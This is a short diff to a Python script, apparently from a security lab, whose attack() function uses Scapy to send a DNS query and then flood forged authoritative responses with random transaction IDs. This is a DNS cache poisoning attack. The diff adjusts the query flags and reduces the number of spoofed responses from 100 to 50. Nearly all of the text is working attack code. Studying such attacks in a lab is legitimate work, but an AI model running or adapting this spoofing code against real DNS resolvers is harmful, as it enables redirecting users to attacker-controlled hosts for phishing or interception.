@@ -62,7 +62,7 @@ def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     sock.bind((my_ip, my_port))
 
-    dns_request = DNS(rd=1, qr=1, aa=1, qdcount=1, qd=DNSQR(qname=base_domain))
+    dns_request = DNS(rd=1, qdcount=1, qd=DNSQR(qname=base_domain))
     # DNS(rd=1, qd=DNSQR(qname=base_domain))
     fake_response = DNS(rd=1, id=42, qr=1, aa=1, qdcount=1, ancount=0, nscount=1, arcount=0, 
 		qd=DNSQR(qname=base_domain), 
@@ -82,7 +82,7 @@ def attack():
         # send dns query
         sendPacket(sock, dns_request, my_ip, dns_port)
         print "Request sent\n", dns_request.show()
-        for i in range(100):
+        for i in range(50):
             fake_response[DNS].id = getRandomTXID()
             sendPacket(sock, fake_response, my_ip, query_port)
             print fake_response[DNS].id
